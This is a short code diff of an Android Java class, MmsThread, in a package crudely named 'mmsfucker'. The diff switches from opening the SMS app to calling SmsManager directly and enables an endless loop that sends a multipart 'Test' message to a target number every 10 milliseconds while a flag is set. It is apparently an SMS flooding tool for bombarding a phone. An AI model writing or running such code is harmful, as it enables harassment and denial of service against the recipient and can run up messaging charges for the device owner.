@@ -1,10 +1,9 @@
 package com.example.ejkim.mmsfucker;
 
 
-import android.content.Intent;
-import android.net.Uri;
+import android.telephony.SmsManager;
 
-import static android.R.id.message;
+import java.util.ArrayList;
 
 public class MmsThread extends Thread {
 
@@ -13,25 +12,20 @@ public class MmsThread extends Thread {
 
 
     public void run() {
-//        SmsManager smsManager = SmsManager.getDefault();
-//        ArrayList<String> partMessage = smsManager.divideMessage("Test");
-        Intent intent = new Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:" + sendTo));
-        intent.putExtra("sms_body", "message");
-        startActivity(intent);
+        SmsManager smsManager = SmsManager.getDefault();
+        ArrayList<String> partMessage = smsManager.divideMessage("Test");
 
 
         while(true) {
             while (check) {
-//                smsManager.sendMultipartTextMessage(sendTo, null, partMessage, null, null);
+                smsManager.sendMultipartTextMessage(sendTo, null, partMessage, null, null);
 
                 try {
                     sleep(10);
-                }
-                catch (Exception e) {
+                } catch (Exception e) {
 
                 }
             }
         }
-        //
     }
 }
